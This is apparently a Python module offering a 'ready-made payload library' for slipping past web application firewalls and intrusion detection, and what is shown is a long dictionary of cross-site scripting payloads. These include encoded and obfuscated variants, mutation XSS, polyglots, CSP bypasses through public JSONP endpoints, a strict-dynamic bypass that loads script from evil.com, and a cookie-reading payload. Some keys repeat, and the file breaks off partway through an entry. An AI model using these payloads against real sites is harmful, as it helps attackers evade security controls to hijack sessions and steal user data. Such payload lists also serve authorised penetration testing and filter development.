"""
Ready-Made Payload Library for Bypassing WAFs, IPS, IDS, and Firewalls
Contains pre-built payloads for various attack vectors and bypass techniques.
"""

from typing import Dict, List, Optional


class PayloadCategory:
    """Payload categories for organization"""
    XSS = 'xss'
    SQLI = 'sqli'
    COMMAND_INJECTION = 'command_injection'
    PATH_TRAVERSAL = 'path_traversal'
    XXE = 'xxe'
    SSTI = 'ssti'
    SSRF = 'ssrf'
    LDAP = 'ldap'
    NOSQL = 'nosql'
    GENERAL = 'general'


class BypassTarget:
    """Target security control types"""
    WAF = 'waf'
    IPS = 'ips'
    IDS = 'ids'
    FIREWALL = 'firewall'
    FILTER = 'filter'
    ALL = 'all'


class ReadyMadePayloads:
    """Collection of ready-made bypass payloads"""
    
    # XSS Bypass Payloads
    XSS_PAYLOADS = {
        'xss_basic_script': {
            'payload': '<script>alert(1)</script>',
            'description': 'Basic XSS payload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_img_onerror': {
            'payload': '<img src=x onerror=alert(1)>',
            'description': 'Image tag with onerror event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_svg_onload': {
            'payload': '<svg onload=alert(1)>',
            'description': 'SVG tag with onload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_javascript_protocol': {
            'payload': '<a href="javascript:alert(1)">click</a>',
            'description': 'JavaScript protocol in anchor tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_iframe_srcdoc': {
            'payload': '<iframe srcdoc="<script>alert(1)</script>">',
            'description': 'Iframe with srcdoc attribute',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_body_onload': {
            'payload': '<body onload=alert(1)>',
            'description': 'Body tag with onload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_input_onfocus': {
            'payload': '<input onfocus=alert(1) autofocus>',
            'description': 'Input with autofocus and onfocus',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_details_ontoggle': {
            'payload': '<details open ontoggle=alert(1)>',
            'description': 'Details tag with ontoggle event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_marquee_onstart': {
            'payload': '<marquee onstart=alert(1)>',
            'description': 'Marquee tag with onstart event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_style_expression': {
            'payload': '<div style="xss:expression(alert(1))">',
            'description': 'CSS expression (IE only)',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_meta_refresh': {
            'payload': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            'description': 'Meta refresh with JavaScript URL',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_link_import': {
            'payload': '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
            'description': 'HTML import with data URI',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_object_data': {
            'payload': '<object data="javascript:alert(1)">',
            'description': 'Object tag with JavaScript data',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_embed_src': {
            'payload': '<embed src="javascript:alert(1)">',
            'description': 'Embed tag with JavaScript source',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_form_action': {
            'payload': '<form action="javascript:alert(1)"><input type="submit">',
            'description': 'Form with JavaScript action',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_mixed_case': {
            'payload': '<ScRiPt>alert(1)</sCrIpT>',
            'description': 'Mixed case script tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_backticks': {
            'payload': '<script>alert`1`</script>',
            'description': 'Using backticks instead of parentheses',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_handler_spaces': {
            'payload': '<img src=x onerror = alert(1)>',
            'description': 'Event handler with spaces',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_double_encoded': {
            'payload': '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            'description': 'Double URL encoded script',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_unicode': {
            'payload': '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
            'description': 'Unicode encoded JavaScript',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # DOM XSS payloads
        'xss_dom_innerhtml': {
            'payload': '"><img src=1 onerror=alert(document.domain)>',
            'description': 'DOM XSS via innerHTML sink',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_dom_location_hash': {
            'payload': '#<script>alert(1)</script>',
            'description': 'DOM XSS via location.hash',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_dom_document_write': {
            'payload': '"><script>document.write("<img src=x onerror=alert(1)>")</script>',
            'description': 'DOM XSS via document.write',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_dom_eval': {
            'payload': '\';eval(String.fromCharCode(97,108,101,114,116,40,49,41));//',
            'description': 'DOM XSS via eval with fromCharCode',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xss_dom_settimeout': {
            'payload': '"><script>setTimeout("alert(1)",0)</script>',
            'description': 'DOM XSS via setTimeout',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_dom_setinterval': {
            'payload': '"><script>setInterval("alert(1)",1000)</script>',
            'description': 'DOM XSS via setInterval',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Mutation XSS (mXSS)
        'xss_mxss_noscript': {
            'payload': '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            'description': 'Mutation XSS via noscript tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_mxss_select': {
            'payload': '<select><option><script>alert(1)</script></option></select>',
            'description': 'Mutation XSS via select element',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_mxss_template': {
            'payload': '<template><script>alert(1)</script></template>',
            'description': 'Mutation XSS via HTML template element',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Polyglot XSS
        'xss_polyglot_1': {
            'payload': 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            'description': 'Polyglot XSS payload covering multiple contexts',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xss_polyglot_2': {
            'payload': '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm(1)"/alt="/"src="/"onerror=eval(id)>\'',
            'description': 'Complex polyglot XSS payload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xss_polyglot_attr': {
            'payload': '"><\'><script>alert(1)</script>',
            'description': 'Polyglot attribute/HTML context',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Event handler variations
        'xss_event_onmouseover': {
            'payload': '<a href="#" onmouseover="alert(1)">hover</a>',
            'description': 'XSS via onmouseover event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_event_onfocus': {
            'payload': '<input onfocus=alert(1) autofocus>',
            'description': 'XSS via onfocus with autofocus',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_onblur': {
            'payload': '<input onblur=alert(1) autofocus><input autofocus>',
            'description': 'XSS via onblur event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_event_ontoggle': {
            'payload': '<details open ontoggle=alert(1)>',
            'description': 'XSS via details ontoggle event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_onanimationstart': {
            'payload': '<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart=alert(1)>',
            'description': 'XSS via CSS animation event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_onresize': {
            'payload': '<body onresize=alert(1)><iframe></iframe>',
            'description': 'XSS via onresize event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_event_onpointerover': {
            'payload': '<p onpointerover="alert(1)">hover</p>',
            'description': 'XSS via pointer events API',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_event_onwheel': {
            'payload': '<div onwheel=alert(1)>scroll</div>',
            'description': 'XSS via onwheel event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xss_event_ondragover': {
            'payload': '<div ondragover="alert(1)">drag here</div>',
            'description': 'XSS via drag and drop events',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xss_event_onpaste': {
            'payload': '<input onpaste=alert(1)>',
            'description': 'XSS triggered by paste action',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        # HTML tag variations
        'xss_tag_video': {
            'payload': '<video onerror=alert(1) src="x"></video>',
            'description': 'XSS via video tag onerror',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_audio': {
            'payload': '<audio onerror=alert(1) src=x>',
            'description': 'XSS via audio tag onerror',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_object': {
            'payload': '<object data="javascript:alert(1)">',
            'description': 'XSS via object tag data attribute',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_embed': {
            'payload': '<embed src="javascript:alert(1)">',
            'description': 'XSS via embed tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_marquee': {
            'payload': '<marquee onstart=alert(1)>',
            'description': 'XSS via marquee onstart event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_tag_body_onload': {
            'payload': '<body onload=alert(1)>',
            'description': 'XSS via body onload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_textarea': {
            'payload': '</textarea><script>alert(1)</script>',
            'description': 'Breaking out of textarea context',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_tag_title_break': {
            'payload': '</title><script>alert(1)</script>',
            'description': 'Breaking out of title context',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_tag_math': {
            'payload': '<math><mtext></table></math><img src=x onerror=alert(1)>',
            'description': 'XSS via MathML namespace confusion',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_tag_svg_animate': {
            'payload': '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            'description': 'SVG animate element XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_svg_set': {
            'payload': '<svg><set onbegin=alert(1) attributeName=x>',
            'description': 'SVG set element XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tag_iframe_srcdoc': {
            'payload': '<iframe srcdoc="<script>alert(1)</script>">',
            'description': 'XSS via iframe srcdoc attribute',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_tag_base_href': {
            'payload': '<base href="javascript:alert(1);//">',
            'description': 'XSS via base href hijacking',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Attribute-based XSS
        'xss_attr_href_js': {
            'payload': '<a href="javascript:alert(1)">click</a>',
            'description': 'XSS via javascript: href',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_attr_href_entity': {
            'payload': '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
            'description': 'XSS href with HTML entities',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_attr_src_data_uri': {
            'payload': '<img src="data:text/html,<script>alert(1)</script>">',
            'description': 'XSS via data URI in src',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_attr_formaction': {
            'payload': '<form><button formaction="javascript:alert(1)">click</button></form>',
            'description': 'XSS via formaction attribute',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_attr_xlink_href': {
            'payload': '<svg><use xlink:href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/>',
            'description': 'XSS via SVG xlink:href',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Encoding bypass variations
        'xss_html_entity_dec': {
            'payload': '&#60;script&#62;alert(1)&#60;/script&#62;',
            'description': 'HTML decimal entities XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_html_entity_hex': {
            'payload': '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            'description': 'HTML hex entities XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_url_encoded': {
            'payload': '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
            'description': 'URL encoded XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_double_url_encoded': {
            'payload': '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
            'description': 'Double URL encoded XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_base64_eval': {
            'payload': '<script>eval(atob("YWxlcnQoMSk="))</script>',
            'description': 'XSS via base64 encoded payload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_string_fromcharcode': {
            'payload': '<script>alert(String.fromCharCode(88,83,83))</script>',
            'description': 'XSS using String.fromCharCode',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_hex_encoded_chars': {
            'payload': '<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>',
            'description': 'Hex encoded JavaScript chars',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # WAF evasion techniques
        'xss_null_bytes': {
            'payload': '<scr\x00ipt>alert(1)</scr\x00ipt>',
            'description': 'Null byte injection in script tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_tab_injection': {
            'payload': '<img\tsrc=x\tonerror=alert(1)>',
            'description': 'Tab characters to bypass filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_newline_injection': {
            'payload': '<img\nsrc=x\nonerror=alert(1)>',
            'description': 'Newline characters to bypass filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_carriagereturn': {
            'payload': '<img\rsrc=x\ronerror=alert(1)>',
            'description': 'Carriage return to bypass filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_mixed_case': {
            'payload': '<ScRiPt>AlErT(1)</sCrIpT>',
            'description': 'Mixed case to bypass case-sensitive filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_script_without_quotes': {
            'payload': '<script>alert`1`</script>',
            'description': 'XSS using template literals without quotes',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_no_parentheses': {
            'payload': '<img src=x onerror="window.onerror=eval;throw\'=alert\\x281\\x29\'">',
            'description': 'XSS without parentheses',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_no_parentheses_2': {
            'payload': '<img src=x onerror=alert;onerror=alert>',
            'description': 'XSS no parentheses variant 2',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # CSP bypass payloads
        'xss_csp_jsonp': {
            'payload': '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">',
            'description': 'CSP bypass via JSONP endpoint',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_csp_angular_ng_src': {
            'payload': '<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">',
            'description': 'CSP bypass via Google API JSONP',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_csp_nonce_steal': {
            'payload': '"><script nonce=NONCE_HERE>alert(1)</script>',
            'description': 'CSP nonce theft template',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_csp_strict_dynamic': {
            'payload': '<script>document.currentScript.parentNode.appendChild(document.createElement("script")).src="//evil.com/xss.js"</script>',
            'description': 'CSP strict-dynamic bypass via createElement',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Framework-specific XSS
        'xss_angular_template': {
            'payload': '{{constructor.constructor(\'alert(1)\')()}}',
            'description': 'AngularJS template injection XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xss_angular_ng_app': {
            'payload': '<div ng-app ng-csp>{{$eval.constructor(\'alert(1)\')()}}</div>',
            'description': 'AngularJS ng-csp bypass',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xss_vue_template': {
            'payload': '{{_c.constructor(\'alert(1)\')()}}',
            'description': 'Vue.js template injection',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xss_react_dangeroushtml': {
            'payload': '{"__html": "<img src=x onerror=alert(1)>"}',
            'description': 'React dangerouslySetInnerHTML payload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Protocol-based XSS
        'xss_protocol_vbscript': {
            'payload': '<a href="vbscript:msgbox(1)">click</a>',
            'description': 'VBScript protocol XSS (IE)',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_protocol_data_uri': {
            'payload': '<iframe src="data:text/html,<script>alert(parent.document.domain)</script>">',
            'description': 'Data URI iframe XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_protocol_data_base64': {
            'payload': '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            'description': 'Data URI with base64 encoded XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Comment obfuscation
        'xss_comment_break': {
            'payload': '<script>/*</script><script>*/alert(1)//</script>',
            'description': 'XSS using comment injection to break filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_html_comment': {
            'payload': '<!--<img src="--><img src=x onerror=alert(1)>//',
            'description': 'HTML comment injection XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # JavaScript obfuscation
        'xss_js_concat': {
            'payload': '<script>var a="al"; var b="ert"; window[a+b](1)</script>',
            'description': 'XSS using string concatenation obfuscation',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_js_brackets': {
            'payload': '<script>window["al"+"ert"](1)</script>',
            'description': 'XSS using bracket notation',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_js_constructor': {
            'payload': '<script>[].constructor.constructor("alert(1)")()</script>',
            'description': 'XSS using constructor chain',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_js_function': {
            'payload': '<script>Function("alert(1)")()</script>',
            'description': 'XSS using Function constructor',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_js_settimeout_string': {
            'payload': '<script>setTimeout("alert(1)")</script>',
            'description': 'XSS via setTimeout with string arg',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # SVG-based XSS
        'xss_svg_onload': {
            'payload': '<svg onload=alert(1)>',
            'description': 'SVG onload XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_svg_script': {
            'payload': '<svg><script>alert(1)</script></svg>',
            'description': 'Script inside SVG',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_svg_foreignobject': {
            'payload': '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
            'description': 'SVG foreignObject XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_svg_use': {
            'payload': '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/>',
            'description': 'SVG use element XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Attribute injection
        'xss_attr_injection_style': {
            'payload': '" style="x:expression(alert(1))',
            'description': 'IE CSS expression XSS',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_attr_injection_event': {
            'payload': '" onmouseover="alert(1)" "',
            'description': 'Attribute injection via event handler',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_single_quote_attr': {
            'payload': "' onmouseover='alert(1)",
            'description': 'Single quote attribute injection',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Advanced filter bypass
        'xss_tag_broken': {
            'payload': '<<script>alert(1)//<</script>',
            'description': 'Broken tag filter bypass',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_recursive_tag': {
            'payload': '<scr<script>ipt>alert(1)</scr</script>ipt>',
            'description': 'Recursive tag bypass for naive filters',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_space_before_attr': {
            'payload': '<img/src=x onerror =alert(1)>',
            'description': 'Space before attribute value bypass',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_extra_angle_bracket': {
            'payload': '<img src=">" onerror=alert(1)>',
            'description': 'Extra angle bracket confusion',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Stored XSS context breaks
        'xss_json_context': {
            'payload': '"}; alert(1); {"',
            'description': 'XSS in JSON context',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_js_string_break': {
            'payload': '\'; alert(1); //',
            'description': 'XSS breaking out of JavaScript string',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_js_string_break_dq': {
            'payload': '"; alert(1); //',
            'description': 'XSS breaking out of double-quoted JS string',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_css_expression': {
            'payload': '<div style="background-image: url(javascript:alert(1))">',
            'description': 'XSS via CSS background-image URL',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Additional advanced payloads
        'xss_meta_refresh': {
            'payload': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            'description': 'XSS via meta refresh redirect',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_link_tag': {
            'payload': '<link rel="stylesheet" href="javascript:alert(1)">',
            'description': 'XSS via link tag href',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_input_type_image': {
            'payload': '<input type="image" src=x onerror=alert(1)>',
            'description': 'XSS via input type image',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_iframe_js': {
            'payload': '<iframe src="javascript:alert(1)">',
            'description': 'XSS via iframe javascript src',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_html5_hidden_input': {
            'payload': '<input type=hidden accesskey=X onclick=alert(1)>',
            'description': 'XSS via hidden input accesskey (CSRF-like)',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'xss_js_waf_bypass_space': {
            'payload': '<script>alert/*comment*/(1)</script>',
            'description': 'Inline comment inside function call to bypass WAF',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_waf_bypass_plus': {
            'payload': '<script>alert(1+1)</script>',
            'description': 'Alert with expression instead of literal',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_waf_bypass_encoding_src': {
            'payload': '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
            'description': 'Encoded javascript: in img src',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_percent_20_tag': {
            'payload': '<%00script>alert(1)</%00script>',
            'description': 'Null byte in script tag name',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_backtick_href': {
            'payload': '<a href=`javascript:alert(1)`>click</a>',
            'description': 'Backtick as attribute delimiter',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xss_uppercase_tag': {
            'payload': '<SCRIPT>alert(1)</SCRIPT>',
            'description': 'Uppercase script tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_js_location_href': {
            'payload': '<script>location.href="javascript:alert(1)"</script>',
            'description': 'XSS via location.href assignment',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_on_error_img_space': {
            'payload': '<img src = x onerror = "alert(1)">',
            'description': 'Spaces around attribute assignments',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xss_confirm': {
            'payload': '<script>confirm(document.cookie)</script>',
            'description': 'XSS using confirm to exfiltrate cookies',
